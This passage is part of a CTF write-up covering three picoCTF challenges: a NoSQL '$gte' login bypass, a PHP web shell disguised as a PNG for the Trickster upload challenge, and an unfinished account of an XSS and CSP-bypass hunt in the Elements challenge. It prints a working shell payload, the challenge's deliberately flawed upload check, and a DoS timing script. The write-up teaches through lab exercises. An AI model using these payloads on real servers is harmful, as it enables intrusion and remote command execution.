    If we look at what will happen when you login, you'll see it returns all users that it matched.
    If you are looking at BurpSuite, you'll see the request in the <code>Target</code> tab, alternatively,
    open up DevTools and click on the network tab, there you'll see the request:
  </p>

  <HTTP
    class="p-8 rounded-lg not-tw-prose bg-zinc-800"
    method="POST"
    url="http://atlas.picoctf.net:63191/login"
    status={200}
    reqBody={{
      type: "application/json",
      data: { email: '{ "$gte": "" }', password: '{ "$gte": "" }' },
    }}
    resBody={{
      type: "application/json",
      data: {
        _id: "65f08c7b410684fbd599d448",
        email: "joshiriya355@mumbama.com",
        firstName: "Josh",
        lastName: "Iriya",
        password: "Je80T8M7sUA",
        token:
          "cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzUzZDkwZTI4fQ==",
        __v: 0,
      },
    }}
  />

  <p class="text-sm italic">
    Note: The response body is actually an array of users, but since there is only 1 entry so I
    flattened it can have this nice formatting
  </p>

  <p>
    If you do not see that request, make sure <code>Preserve Log</code> is checked. That way you won't
    lose the request when it redirects.
  </p>

  <p>
    And there we have it! The flag is encoded in Base64 under the <code>token</code> field.
  </p>

  <h2 id="trickster">Trickster</h2>

  <p>
    This challenge was solved by my teammate <DiscordMention>smashmaster</DiscordMention>, we've
    seen challenges like this so very quickly we realized we needed to upload a file that the server
    <em>thought</em> was a png, but in reality was a php file. This solve also seemed to match up with
    the name of the challenge.
  </p>

  <p>
    smashmaster played around with the program a bit, and ended up guessing that the files you
    uploaded were put into the <code>/uploads/</code> subdirectory. So all he needed to do was to craft
    a php reverse shell that also looked like a png.
  </p>

  <p>The payload he ended up with was:</p>

  <Prism
    code={`�PNG


IHDR�Xr�sRGB��� IDATx���y�l�]��ﻝ��uow�[j�F�ľ�1��bl�1\`������\`�3x�6�0f�Yd�A�Y����]H�X$$6�A�Xڢ%z��*3�9�2��=��jAK}[�M?��TUYY'3�"���~�kJ)�#e���(����KDDDDDDDD��,9j
�DDDDDDDD�)����KDDDDDDDD��,9j
�DDDDDDDD�)����KDDDDDDDD��,9j
�DDDDDDDD�)����KDDDDDDDD��,9j
�DDDDDDDD�)����KDDDDDDDD��,9j
�DDDDDDDD�)����KDDDDDDDD��,9j
�DDDDDDDD�)����KDDDDDDDD��,9j
�DDDDDDDD�)����KDDDDDDDD��,9j
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
`}
    lang="php"
  />

  <p>
    Nothing fancy, just a php reverse shell attached directly after a valid PNG. smashmaster named
    the file <code>polygot.png.php</code> because the server checks to see if <code>.png</code> is in
    the name of the file.
  </p>

  <p>
    After uploading, you can just access
    <code>https://atlas.picoctf.net:50563/uploads/poly.png.php?cmd=</code> and stick whatever command
    you want after. You now have full RCE on the server, so now we need to go find the flag.
  </p>

  <p>
    After poking around a bit, you'll find some files in the parent directory. <code>ls ..</code> gives
    you
  </p>
  <pre class="language-text"><code class="language-text"
      >GQ4DOOBVMMYGK.txt
index.php
instructions.txt
robots.txt
uploads
</code></pre>

  <p>
    <code>cat</code>ting the suspicious looking file gives us the flag yay!
  </p>
  <h3>Poking around some more</h3>
  <p>
    After that smashmsater poked around a bit more. <code>instructions.txt</code> looks like a prompt
    to an LLM to generate the source code for the challenge.
  </p>
  <pre class="language-text"><code class="language-text"
      >Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
</code></pre>
  <details>
    <summary class="cursor-pointer">Finally, the source code of the challenge itself:</summary>
    <Prism
      code={`<!DOCTYPE html>
<html>
<head>
    <title>File Upload Page</title>
</head>
<body>
    <h1>Welcome to my PNG processing app</h1>

    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $uploadDirectory = 'uploads/';
        $uploadedFileName = $_FILES['file']['name'];
        $uploadedFile = $_FILES['file']['tmp_name'];

        // Check if the file has a ".png" in its name
        if (stripos($uploadedFileName, '.png') !== false) {
            // Check the first 4 bytes of the file for "50 4E 47" (PNG file signature)
            $fileContents = file_get_contents($uploadedFile);
            $fileSignature = bin2hex(substr($fileContents, 0, 4));
            
            //if ($fileSignature === '504e47')
            if (strpos($fileSignature, '504e47') !== false) {
                $destinationPath = $uploadDirectory . $uploadedFileName;

                if (move_uploaded_file($uploadedFile, $destinationPath)) {
                    echo "File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully";
                } else {
                    echo "Error: File upload failed.";
                }
            } else {
                echo "Error: The file is not a valid PNG image: ".$fileSignature;
            }
        } else {
            echo "Error: File name does not contain '.png'.";
        }
    }
    ?>

    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".png">
        <input type="submit" value="Upload File">
    </form>
</body>
</html>`}
    />
  </details>

  <h2 id="elements">Elements</h2>

  <p>
    Alright its time for the main course! <a href="https://larry.sh/" target="_blank">EhhThing</a>'s
    annual hellscape, Elements!! Last year, he wrote msfroggenerator2, which was very difficult. I
    was very excited when I heard he wrote another challenge for this year.
  </p>

  <p>
    Before I start talking about the solution, I would like to thank
    <a href="https://amateurs.team" target="_blank">my team</a> for helping out with this challenge.
    This challenge could have not been possible without my incredible teammates who constantly push me
    to be the best I can be, as well as provide assistance whenever possible.
  </p>

  <p>
    If you can, find yourself a team to play with, playing CTFs with friends is infintely more fun
    than playing alone.
  </p>

  <p>
    Anyways, onto the solution! The next few pages of words will be full of pure malding and will
    outline everything that we tried before eventually arriving at our solution, so if you want to
    skip that, click here:
    <a href="#elements-bringing-it-all-together">Gimmie Solution!!</a>
  </p>
  <h3 id="elements-overview" class="elements-heading">Overview</h3>
  <p>
    Lets go through a quick rundown of this challenge. Elements is an
    <a href="https://neal.fun/infinite-craft/" target="_blank">Infinite Craft</a> clone, and our end
    goal is to get XSS and bypass the Content Security Policy preventing us from leaking any info. There
    are 4 important files. This section will be a brief overview of the files, but I recommend you download
    the challenge yourself and try to understand the files yourself.
  </p>
  <ul>
    <li>
      <code>index.mjs</code>: The main server code, this is what is responsible for serving files
      and spawning the admin bot. We'll be covering this file quite a lot because its the most
      important file in this challenge.
    </li>
    <li>
      <code>static/index.js</code>: This is the client code, we'll use this file to get XSS, apart
      from giving us XSS it doesn't really need to be analyzed. You get XSS by crafting the "XSS"
      element, which we'll cover in
      <a href="#elements-getting-eval">Getting Eval</a>.
    </li>
    <li>
      <code>chromium.diff/chromium.deb</code>: This is the custom chromium patch that patches one of
      the unintended solutions to this challenge. We'll go over which unintended this patches,
      because although its not the possible to use it to solve, its still interesting to talk about.
    </li>
    <li>
      <code>Dockerfile</code>: This is what brings everything together and what is actually being
      run on the server. make sure to understand that it starts a display and chrome is not
      headless.
    </li>
  </ul>

  <h3 id="elements-getting-eval" class="elements-heading">Getting Eval</h3>
  <p>
    <code>eval</code> is called in <code>static/index.js</code> when you craft the "XSS" element. This
    is done by combining the 4 elements until you get the XSS element.
  </p>
  <Prism
    code={`const evaluate = (...items) => {
  const [a, b] = items.sort();
  for (const [ingredientA, ingredientB, result] of recipes) {
    if (ingredientA === a && ingredientB == b) {
      if (result === "XSS" && state.xss) {
        eval(state.xss);
      }
      return result;
    }
  }
  return null;
};
    `}
  />
  <p>
    We can pass in a list of recipe steps in order to craft whatever we want. This means we can pass
    the steps required to make the XSS element in order to get an <code>eval</code> call.
  </p>
  <Prism
    code={`try {
  state = JSON.parse(atob(window.location.hash.slice(1)));
  for (const [a, b] of state.recipe) {
    if (!found.has(a) || !found.has(b)) {
      break;
    }
    const result = evaluate(a, b);
    found.set(result, elements.get(result));
  }
} catch (e) {}
`}
  />
  <p>
    Generating the correct steps is not a trivial question though. I myself wrote a really crappy
    solution then manually sorted the list so it would craft things in the correct order, but my orz
    teammate <DiscordMention>skittles1412</DiscordMention> (usaco platinum, ioi gold? wow so orz) wrote
    a much better solution, so I'll be showcasing his solution instead.
  </p>
  <p>
    The pairs of things you can combined to make a seperate thing is stored in a array called
    <code>recipes</code>
  </p>
  <Prism
    code={` const recipes = [
    ["Ash", "Fire", "Charcoal"],
    ["Steam Engine", "Water", "Vapor"],
    ["Brick Oven", "Heat Engine", "Oven"],
    ["Steam Engine", "Swamp", "Sauna"],
    ["Magma", "Mud", "Obsidian"],
    ["Earth", "Mud", "Clay"],
    ...
    ["Exploit", "Web Design", "XSS"],
  ]
    `}
  />
  <p>
    The first two values of each row is the two things you need to combine to make the third thing.
    For instance, <code>Exploit</code> and <code>Web Design</code> combine to make <code>XSS</code>.
    We only start off with 4 elements (Fire, Water, Earth, and Air), and we need to combine our way
    to "XSS"
  </p>
  <p>
    The way we'll solve it is called DFS or
    <a href="https://en.wikipedia.org/wiki/Depth-first_search" target="_blank">Depth-First Search</a
    >, in essence we figure out what two elements we need to create <code>XSS</code> (<code
      >Exploit</code
    >
    and
    <code>Web Design</code>), then figure out the two elements required to make <code>Exploit</code>
    (<code>Cybersecurity</code> and <code>Vulnerability</code>), then the two elements required to
    make Cybersecurity, until we have a path from the original 4 ingredients to our desired XSS
    element.
  </p>
  <p>If that was a little confusing, lets take a look at the code to solve this.</p>

  <Prism
    code={`const graph = {};

// constructs map for element => ingredients
for (const [u1, u2, v] of recipes) {
	graph[v] = [u1, u2];
}

const visited = {};
const base = ["Fire", "Air", "Water", "Earth"];
const out = [];

function dfs(element) {
	if (visited[element] || base.includes(element)) {
		return;
	}
	visited[element] = true;

    // get recipes for parents
	for (const parent of graph[element]) {
		dfs(parent);
	}
  
    // push the recipe onto the solution
	out.push(graph[element]);
}

dfs("XSS");

console.log(JSON.stringify(out));`}
  />
  <p>
    Here is a visualization of the algorithm. <span class="font-bold text-yellow-300">Yellow</span>
    dots are the core 4 ingredients that you start with,
    <span class="font-bold text-blue-300">blue</span> dots are things that are already created. Hover
    over any element to see its name.
  </p>
  <div class="flex items-center justify-center gap-4 px-4 py-1 rounded-t-lg bg-zinc-800">
    <span class="font-mono"
      >Step <b>{allowedStep.toString().padStart(2, "0")}</b> of <b>{step}</b></span
    >
    <input type="range" min={0} max={step} bind:value={allowedStep} class="flex-1 h-4 rounded-md" />
  </div>
  <svg class="w-[150%] -translate-x-[16.66666666%] p-8 rounded-lg bg-zinc-800 h-[36rem]">
    <ElementsDfsResult res={filteredCallTree} x={70} y={40} />
  </svg>
  <p>
    An intresting consequence of reusing stuff is the graph becomes a lot more left heavy as a lot
    of the algorithm earlier needs to traverse deeper, but later in the algorithm, it doesn't need
    to as the things it runs into are already created for it.
  </p>

  <p>Cool, now that we have XSS on the page, the solve should be easy right? right??</p>
  <h3 id="elements-csp" class="elements-heading">Sweet, Sweet, Hellish CSP</h3>
  <p>
    CSP, or
    <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank"
      >Content Security Policy</a
    > is a web technology that allows a website to control how resources are loaded and used. The challenge
    has only started. We need to find a way to bypass the CSP in order to win, because if we don't bypass
    CSP, we won't be able to leak any information, and that includes the flag.
  </p>
  <p>So, lets take a look at the CSP, shall we?</p>
  <Prism
    code={`const csp = [
	"default-src 'none'",
	"style-src 'unsafe-inline'",
	"script-src 'unsafe-eval' 'self'",
	"frame-ancestors 'none'",
	"worker-src 'none'",
	"navigate-to 'none'"
]`}
  />
  <p>Lets go over every part of this CSP, and see what it prevents us from doing.</p>
  <ol>
    <li>
      <code>default-src 'none'</code>: This line prevents you from loading any resource from any url
      unless otherwise specified. This means no loading images, fonts, etc. from external websites.
    </li>
    <li>
      <code>style-src 'unsafe-inline'</code>: This line <b>allows</b> styling as long as its done
      inline (with the <code>&lt;style&gt;</code> tag).
    </li>
    <li>
      <code>script-src 'unsafe-eval' 'self'</code>: This line <b>allows</b> javascript being run
      when using the <code>eval</code> function, or if it is from the current origin, this means it
      can load <code>static/index.js</code> from the server without it getting blocked.
    </li>
    <li>
      <code>frame-ancestors 'none'</code>: No <code>&lt;iframe&gt;</code>s allowed :(
    </li>
    <li>
      <code>worker-src 'none'</code>: Prevents you from using the
      <a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker" target="_blank"
        >WebWorkers API</a
      >.
    </li>
    <li>
      <code>navigate-to 'none'</code>: Disables any form of redirect to another page, even links are
      disabled.
    </li>
  </ol>
  <p>
    This is incredibly strict, barely allowing us to do anything. There are a couple more
    mitigations to possible unintendeds that EhhThing put in place, but we'll cover them as they pop
    up.
  </p>
  <h3 id="elements-setting-up" class="elements-heading">Setting Up the Enviornment</h3>
  <p>
    This is probably the most important step in any web challenge, which is setting up the
    enviornment for this challenge. I usually skimp over this step, and it has bit me in the ass
    many, many times.
  </p>
  <p>
    In this challenge, we need to setup the custom chromium build as well as hosting the server (
    <code>index.mjs</code>). Hosting the server is as easy as <code>node index.mjs</code> because there
    are no dependencies (thank you ehhthing!), but getting the chromium build is slightly harder
  </p>
  <p>
    First thing we do is unpack <code>chrome.deb</code>
  </p>
  <Prism
    code={`$ mkdir chrome
$ cd chrome
$ ar x ../chrome.deb`}
    lang="text"
  />
  <p>Inside we'll find two more tar files.</p>
  <Prism
    code={`$ ls
control.tar  data.tar  debian-binary`}
  />
  <p>
    Unpack <code>data.tar</code>, and you'll find the chrome binary sitting at
    <code>opt/chromium.org/chromium-unstable/chromium-browser-unstable</code>
  </p>
  <Prism
    code={`$ tar -xvf data.tar
$ ./opt/chromium.org/chromium-unstable/chromium-browser-unstable`}
  />
  <p>Cool, now we have the same browser that will be used for the admin bot.</p>
  <h3 id="elements-initial-ittempts" class="elements-heading">Initial Attempts</h3>

  <p>
    There are two commonly used CSP bypasses, DNS Prefetch, and using WebRTC. Both can leak data
    through a strict CSP. Both leaks do not involve the HTTP layer, which allows it to bypass the
    CSP.
  </p>
  <p>
    We can use WebRTC by abusing a setting in
    <a
      href="https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/RTCPeerConnection"
      target="_blank"
    >
      <code>RTCPeerConnection</code>
    </a>. More specifically the <code>iceServers</code> option (ICE stands for Interactive
    Connectivity Establishment), which allows us to specify a list of <code>STUN</code> servers
    which will be used to resolve other clients for RTC. This means we can specify our own server as
    a <code>STUN</code> server, and it will be requested when the <code>RTCPeerConnection</code> gets
    used.
  </p>
  <p>
    Unfortunately its not that easy, if we look at <code>chromium.diff</code>, we'll find that
    <code>RTCPeerConnection</code> was patched out.
  </p>
  <Prism
    code={`diff --git a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
index f0948629cb..393e7c77e0 100644
--- a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
+++ b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
@@ -61,10 +61,7 @@ enum RTCPeerConnectionState {
 // https://w3c.github.io/webrtc-pc/#interface-definition

 [
-    ActiveScriptWrappable,
-    Exposed=Window,
-    LegacyWindowAlias=webkitRTCPeerConnection,
-    LegacyWindowAlias_Measure
+    ActiveScriptWrappable
 ] interface RTCPeerConnection : EventTarget {
     // TODO(https://crbug.com/1318448): Deprecated \`mediaConstraints\` should be removed.
     [CallWith=ExecutionContext, RaisesException] constructor(optional RTCConfiguration configuration = {}, optional GoogMediaConstraints mediaConstraints);
`}
    lang="diff"
  />
  <p>
    Taking a quick glance at the diff, we can see the line <code>Exposed=Window</code> and
    <code>LegacyWindowAlias=webkitRTCPeerConnection</code> were removed, and we can pretty
    confidently say that <code>RTCPeerConnection</code> is not accessable from javascript anymore.
  </p>
  <p>
    We can also test this in our newly setup chromium instance. Inside the modified chrome, try
    looking for <code>RTCPeerConnection</code> in the javascript console, you won't be able to find it.
  </p>
  <p>
    So we can't use <code>WebRTC</code>. What a shame, we also look into DNS prefetch, but we'll see
    it doesn't work.
  </p>

  <p>
    <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch" target="_blank"
      >DNS prefetch</a
    >
    is a browser feature that allows the browser to resolve website IPs through DNS before you click
    on any link. This drastically decreases load times but we can also use it to leak information.
  </p>
  <p>
    I'm not going to cover it in too much detail here, but I highly recommend the paper
    <a
      href="https://www.cse.chalmers.se/research/group/security/pdf/data-exfiltration-in-the-face-of-csp.pdf"
    >
      Data Exfiltration in the Face of CSP
    </a> which goes over DNS prefetch much more thoroughly.
  </p>
  <p>
    I was quite convinced that DNS prefetch was the intended solution because DNS prefetch doesn't
    work without a display, and this challenge spawned an display (<code>start_display.sh</code>) so
    it made sense to me that DNS prefetch should work.
  </p>
  <p>
    After a while of tinkering with DNS prefetch, I was unable to get it to work and smashmaster
    pointed out that <code>network_prediction_options</code> was set to 2 in the preferences.
  </p>
  <Prism
    code={`await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({
	net: {
		network_prediction_options: 2
	}
}));`}
  />
  <p>
    At first I thought a setting of 2 would always allow DNS prefetching, but after finding and <a
      href="https://admx.help/?Category=EdgeChromium&Policy=Microsoft.Policies.Edge::NetworkPredictionOptions"
      >consulting a docs page</a
    > I found out that 2 meant "Don't predict network actions on any network connection"
  </p>
  <p>Alright, those two ideas are dead. I have no more ideas.</p>
  <h3 id="elements-araoi" class="elements-heading">A Random Assortment of Ideas</h3>
  <p>
    At this point smashmaster and I started searching for some new ideas. I'm just going to
    rapid-fire through them but here are some ideas we considered.
  </p>
  <p>
    We looked into maybe some sort of CSS injection because of
    <code>style-src 'unsafe-inline'</code>, but after thinking about it for a minute we realized
    that wasn't going to happen.
  </p>
  <p>
    We looked into the <a
      href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri"
      ><code>report-uri</code></a
    >
    and
    <a
      href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to"
      ><code>report-to</code></a
    > CSP directives before realizing there was no way to append these directives to the CSP that the
    server served to us.
  </p>
  <p>
    We also tried closing the admin bot window with <code>window.close()</code> so the
    <code>process.kill</code> would throw an error, but 1. <code>window.close()</code> did not work
    and, 2. We missed the massive <code>try ... catch </code> block around <code>process.kill</code>
  </p>
  <p>
    Another small thing we tried was creating an <code>&lt;a&gt;</code> tag and using
    <code>element.click()</code>
    to navigate to another page, but <code>navigate-to</code> also stops these anchor tags which proved
    to be very annoying.
  </p>
  <p>
    At this point smashmaster and I started looking through some more
    <a href="https://developer.mozilla.org/en-US/docs/Web/API" target="_blank">web APIs</a>, seeing
    if any of them could be of any use to us.
  </p>
  <ul>
    <li>
      <a
        href="https://developer.mozilla.org/en-US/docs/Web/API/CSS_Font_Loading_API"
        target="_blank"
      >
        CSS font loading API
      </a> - Failed: Covered by CSP
    </li>
    <li>
      <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fenced_frame_API" target="_blank">
        Fenced Frame API
      </a> - Failed: Covered by CSP + very confusing to use
    </li>
    <li>
      <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebTransport" target="_blank">
        <code>WebTransport</code>
      </a>
      - Failed: We thought it was a similar API to WebRTC, and we could somehow pull off an
      <code>iceServers</code> trick but for this, unfortunately, no dice. Also covered by CSP
    </li>
    <li>
      <a
        href="https://developer.mozilla.org/en-US/docs/Web/API/Payment_Request_API"
        target="_blank"
      >
        Payment Request API
      </a> - Failed: Covered by CSP
    </li>
  </ul>
  <p>
    So it seems like the chrome developers are smarter than we anticipated, and all the APIs adhere
    to the CSP policy.
  </p>
  <h3 id="elements-dos" class="elements-heading">The DoS Era</h3>
  <p>
    By this point, our crypto main <DiscordMention>HELLOPERSON</DiscordMention> had just blooded flag_printer
    with skittles1412, so he was able to help out with elements now.
  </p>
  <p>
    We started looking into somehow performing a Denial of Service attack on the server, and then
    being able to detect that to leak info.
  </p>
  <p>
    HELLOPERSON looked into some DoS bugs on the <a
      href="https://issues.chromium.org/"
      target="_blank">Chromium Issues</a
    > website. We ended up not using any of these, but they are here for the intrested.
  </p>
  <details>
    <summary>Show DoS Bugs</summary>
    <!-- prettier-ignore -->
    <ul>
      <li><a href="https://issues.chromium.org/issues/326091489" target="_blank">Tab crashes when setting css cursor to svg with width or height = "128px""</a></li>
      <li><a href="https://issues.chromium.org/issues/326490765" target="_blank">3.Observed iframe crashes 4.Observed iframe is white in #122.0.6261.69</a></li>
      <li><a href="https://issues.chromium.org/issues/326091167" target="_blank">Chrome chrashes on page load with error STATUS_ACCESS_VIOLATION</a></li>
      <li><a href="https://issues.chromium.org/issues/324853421" target="_blank">SVG Memory exhaustion via inline XSLT in IMG tag</a></li>
      <li><a href="https://issues.chromium.org/issues/40946317" target="_blank">Chrome confused while loading page</a></li>
      <li><a href="https://issues.chromium.org/issues/40945241" target="_blank">nullptr read during &lt;slot&gt; movement on media query</a></li>
      <li><a href="https://issues.chromium.org/issues/40286655" target="_blank">CHECK failure with MathML + ::first-letter</a></li>
      <li><a href="https://issues.chromium.org/issues/40286059" target="_blank">ComputedStyleUtils::ValueForPositionOffset CHECK getting hit in canary</a></li>
      <li><a href="https://issues.chromium.org/issues/40284926" target="_blank">Integer producing CSS Math functions crash with complex arguments</a></li>
      <li><a href="https://issues.chromium.org/issues/40935303" target="_blank">Chrome Browser Dos</a></li>
      <li><a href="https://issues.chromium.org/issues/40934009" target="_blank">Crash occurs in style_resolver.cc when running a HTML file</a></li>
      <li><a href="https://issues.chromium.org/issues/40930304" target="_blank">Huge clip-path on small composited contents creates huge mask layer</a></li>
      <li><a href="https://issues.chromium.org/issues/40072212" target="_blank">drop-shadow filters on a separate layer causes dropped frames in the webpage and browser UI</a></li>
      <li><a href="https://issues.chromium.org/issues/40280103" target="_blank">set opacity of an element to tan(atan2(0.5rem + 1px, 1rem + 1px)) crashes</a></li>
      <li><a href="https://issues.chromium.org/issues/40064810" target="_blank">inconsistency when selecting :empty on chromium</a></li>
      <li><a href="https://issues.chromium.org/issues/40930304" target="_blank">Huge clip-path on small composited contents creates huge mask layer</a></li>
      <li><a href="https://issues.chromium.org/issues/40072212" target="_blank">drop-shadow filters on a separate layer causes dropped frames in the webpage and browser UI</a></li>
      <li><a href="https://issues.chromium.org/issues/40935303" target="_blank">Chrome Browser Dos</a></li>
      <li><a href="https://issues.chromium.org/issues/324853421" target="_blank">SVG Memory exhaustion via inline XSLT in IMG tag</a></li>
      <li><a href="https://issues.chromium.org/issues/40930304" target="_blank">Huge clip-path on small composited contents creates huge mask layer</a></li>
      <li><a href="https://issues.chromium.org/issues/40072212" target="_blank">drop-shadow filters on a separate layer causes dropped frames in the webpage and browser UI</a></li>
      <li><a href="https://issues.chromium.org/issues/324853421" target="_blank">SVG Memory exhaustion via inline XSLT in IMG tag</a></li>
      <li><a href="https://issues.chromium.org/issues/40935303" target="_blank">Chrome Browser Dos</a></li>
      <li><a href="https://issues.chromium.org/issues/40230793" target="_blank">resizing website viewport eats a lot of memory</a></li>
      <li><a href="https://issues.chromium.org/issues/40853375" target="_blank">-webkit-animation this suspected memory leak</a></li>
      <li><a href="https://issues.chromium.org/issues/41323787" target="_blank">[css-contain] Very poor layout performance in Construct 3 PWA</a></li>
      <li><a href="https://issues.chromium.org/issues/40781192" target="_blank">memory leak in @keyframes CSS animation</a></li>
      <li><a href="https://issues.chromium.org/issues/40833572" target="_blank">memory leak in svg with animation, if the stacktrace is anything to go by it looks like it would be (CSS) animation objects not being cleaned up.</a></li>
      <li><a href="https://issues.chromium.org/issues/41361903" target="_blank">blink::Animation objects leak in background tab</a></li>
      <li><a href="https://issues.chromium.org/issues/41426446" target="_blank">svg stroke-dashoffset animation caused page crash</a></li>
      <li><a href="https://issues.chromium.org/issues/41272904" target="_blank">SVG infinite animation lead to memory increase and high CPU utilization</a></li>
      <li><a href="https://issues.chromium.org/issues/324108023" target="_blank">Memory leak with dynamic changes to 'container-type: size'</a></li>
      <li><a href="https://issues.chromium.org/issues/325835006" target="_blank">Memory leak when using :empty::before after node remove</a></li>
      <li><a href="https://issues.chromium.org/issues/40073042" target="_blank">asynchronously setting contain: strict causes memory leak</a></li>
    </ul>
  </details>

  <p>
    Although we ended up not using any of the bugs listed above, we still tried going with the idea
    of DoSing the server.
  </p>

  <p>
    At first we tried using <code>while(1)location.reload()</code> to hopefully force the browser to
    consume enough resources in order to detect some timing difference when requesting other pages.
  </p>

  <p>
    We would request the page multiple times while the browser was alive and then request when the
    browser wasn't active. Then we would find the average request time during both periods.
  </p>

  <Prism
    code={`XSS = """while(1)location.reload()"""

payload = json.dumps({'recipe':recipes, 'xss': XSS})

# starts the browser
r = requests.post(
  f"http://{DOMAIN}/remoteCraft", 
  params={'recipe':payload}
)

# requests over the course of 10 seconds
if True:
    times_run = 0
    sum = 0
    start = time.time()
    while time.time() - start < 10:
        tstart = time.time()
        requests.get(f"http://{DOMAIN}/") 
        tend = time.time()
        sum += tend - tstart
        times_run += 1
    print (f"load avg: {sum / times_run}")


# requests over the course of 10 seconds
# but the browser is off
if True:
    times_run = 0
    sum = 0
    start = time.time()
    while time.time() - start < 10:
        tstart = time.time()
        requests.get(f"http://{DOMAIN}/") 
        tend = time.time()
        sum += tend - tstart
        times_run += 1
    print(f"nonload avg: {sum / times_run}")`}
    lang="python"
  />

  <p>
    Unfortunately, the timing differences between when the browser was open and when it was close
    was too small/variable to detect a difference between the two. We tried other payloads that
    utilized HTML that was rendered really slowly but nothing ended up working.
  </p>

  <p>
    Additionally, skittles1412 thought about filling up the disk until the entire server crashes, he
    ended up getting &gt;9gb of data onto the server, but this ended up not working, also it would
    be very, very slow to exfiltrate data this way.
  </p>

  <p>
    In the end, we spent an entire day chasing this lead. I should have realized that this wasn't
    going anywhere earlier so we could have investigated other things earlier.
  </p>

  <h3 id="elements-back-to-random-apis" class="elements-heading">Back to Random APIs</h3>

  <p>
    Yet again we were out of ideas, so smashmaster went back to looking at new APIs. This time he
    threw out a lot of ideas. He started looking through
    <a
      href="https://chromium.googlesource.com/chromium/src/+/main/third_party/blink/renderer/platform/runtime_enabled_features.json5"
      >this page</a
    >
    in the chromium source. We scanned through <code>LockedMode</code>,
    <code>ModelExecuationAPI</code>, <code>RTCJitterBufferTarget</code>. smashmaster also brought up
    that the
    <a href="https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer/" target="_blank"
      ><code>CredentialContainer</code></a
    >
    from the Credential Management API and how there is an
    <a
      href="https://developer.mozilla.org/en-US/docs/Web/API/CredentialsContainer/create#iconurl"
      target="_blank"><code>iconURL</code></a
    >
    field in the <code>create()</code> method.
  </p>
  <p>
    We tried using the <code>create()</code> method with an <code>iconURL</code> to request a URL, but
    nothing happened when calling the function. So we moved onto the next idea.
  </p>
  <!-- TODO use the correct sample -->
  <Prism
    code={`navigator.credentials
  .create({
    password: {
      id: "ergnjregoith5y9865jhokmfdskl;vmfdl;kfd...",
      name: "fluffybunny",
      origin: "example.com",
      password: "fluffyhaxx0r",
    },
  });`}
  />
  <p>
    Next up was revising
    <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/fencedframe" target="_blank">
      <code> &lt;fencedframe&gt; </code>
    </a>. Last time we looked at it, we didn't really understand what was going on, so this time we
    tried playing around with it some more. This lead didn't last long though, because I decided to
    take a second look at the Credential Management API.
  </p>
  <hr class="max-w-xl m-auto" />
  <p>
    This time, I really wanted to understand how the Credential Management API worked, and what it
    was used for. It bugged me that when we ran the <code>create()</code> function, nothing really happened.
    So I started playing around a bit more with the API as well as read the documentation.
  </p>
  <p>
    The Credential Management API is used when the website wants to store a password to the
    browser's password manager. Using <code>navigator.credentials</code>, which is an instance of
    <code>CredentialContainer</code>, will allow you to manage credientals for the current page by
    interfacing with the browser.
  </p>
  <p>
    <code>CredentialContainer</code> has a couple methods for managing these credientals. You've
    already seen <code>create()</code> but it also has <code>get()</code> and <code>store()</code>
  </p>
  <p>
    There are also multiple types of Credentials that you can store, which can be
    <a href="https://developer.mozilla.org/en-US/docs/Web/API/Credential" target="_blank"
      >found here</a
    >. We'll only be looking at
    <a href="https://developer.mozilla.org/en-US/docs/Web/API/PasswordCredential" target="_blank"
      ><code>PasswordCredential</code></a
    >
    and
    <a href="https://developer.mozilla.org/en-US/docs/Web/API/FederatedCredential" target="_blank"
      ><code>FederatedCredential</code></a
    >
    because those two are the only ones with the <code>iconURL</code> field.
  </p>
  <p>
    When you call <code>navigator.credientals.store(cred)</code> on a
    <code>PasswordCredential</code>
    or <code>FederatedCredential</code>, the user will be prompted to add the credential to the
    browser.
  </p>
  <div
    class="lg:w-[150%] lg:-translate-x-[16.66666666%] grid grid-rows-1 lg:grid-rows-1 gap-8 lg:grid-cols-2 align-center not-tw-prose my-8"
  >
    <div class="m-auto w-fit">
      <div class="p-8 m-auto rounded-lg bg-zinc-800">
        <h3 class="flex items-center gap-2 mb-2 text-2xl">
          <KeyRound class="inline" /> <span>Save Password?</span>
        </h3>
        Username
        <input
          type="text"
          name="body"
          value="fluffybunny"
          class="px-2 mb-4 rounded-md bg-zinc-700"
        /><br />
        Password
        <input
          type="password"
          name="body"
          value="fluffyhaxx0r"
          class="px-2 mb-4 rounded-md bg-zinc-700"
        />
        <div class="mt-2 text-end">
          <button class="px-3 py-1 mr-2 text-blue-300 border border-blue-300 rounded-md"
            >Never</button
          >
          <button class="px-3 py-1 text-white bg-blue-400 border border-blue-400 rounded-md">
            Save
          </button>
        </div>
      </div>
      <div class="mt-1 text-sm italic text-center">Storing a PasswordCredential</div>
    </div>
    <div class="m-auto w-fit">
      <div class="p-8 m-auto rounded-lg bg-zinc-800">
        <h3 class="flex items-center gap-2 mb-2 text-2xl">
